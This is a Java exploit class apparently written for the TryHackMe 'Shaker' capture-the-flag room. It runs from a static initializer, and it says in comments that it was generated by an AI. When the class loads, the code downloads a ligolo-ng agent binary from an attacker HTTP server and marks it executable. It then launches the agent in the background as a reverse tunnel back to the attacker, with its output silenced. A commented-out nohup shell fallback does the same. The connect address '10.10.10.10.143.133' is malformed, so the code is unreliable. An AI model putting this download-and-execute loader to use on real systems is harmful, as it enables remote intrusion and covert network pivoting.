// code generated by Claudi for tryhackme room shaker https://tryhackme.com/room/shaker
// youtube video walk through: https://youtu.be/D93kehXyV2Q
// class upload agent for  ligolo-ng to the target machine, change its permission and run it -connect 10.10.143.133:12348 -ignore-cert
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermissions;

public class Exploit {
    static {
        try {
            // Step 1: Download the binary from your HTTP server
            URL url = new URL("http://10.10.143.133:8000/agent");
            InputStream in = url.openStream();
            String ligoloPath = "/app/agent";
            FileOutputStream out = new FileOutputStream(ligoloPath);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            out.close();
            in.close();
            System.out.println("Ligolo agent downloaded successfully");

            // Step 2: Set executable permissions
            Path agentPath = Paths.get(ligoloPath);
            try {
                Files.setPosixFilePermissions(agentPath, PosixFilePermissions.fromString("rwxr-xr-x"));
                System.out.println("Permissions set successfully");
            } catch (UnsupportedOperationException e) {
                System.err.println("POSIX file permissions are not supported on this system.");
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    Runtime.getRuntime().exec(new String[]{"cmd", "/c", "icacls", ligoloPath, "/grant", "Users:RX"});
                }
            }

            // Step 3: Execute Ligolo agent with correct arguments
            // REMOVED "client" subcommand - Ligolo agent doesn't use it like chisel does
            ProcessBuilder pb = new ProcessBuilder(
                ligoloPath,
                "-connect",
                "10.10.10.10.143.133",
                "-ignore-cert"
            );
            
            // Redirect output to /dev/null to allow it to run independently
            pb.redirectOutput(ProcessBuilder.Redirect.to(new File("/dev/null")));
            pb.redirectError(ProcessBuilder.Redirect.to(new File("/dev/null")));
            
            // Start the process and don't wait for it
            Process process = pb.start();
            System.out.println("Ligolo agent process started");
            
            // Try direct command as fallback using Runtime without the "client" subcommand
         //   try {
           //     Runtime.getRuntime().exec(new String[]{
              //      "/bin/sh",
              //      "-c",
               //     "nohup " + ligoloPath + " -connect 10.10.143.133:12348 -ignore-cert > /dev/null 2>&1 &"
            //    });
            //    System.out.println("Backup agent execution attempted");
          //  } catch (Exception e) {
           //     System.err.println("Backup execution failed: " + e.getMessage());
          //  }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
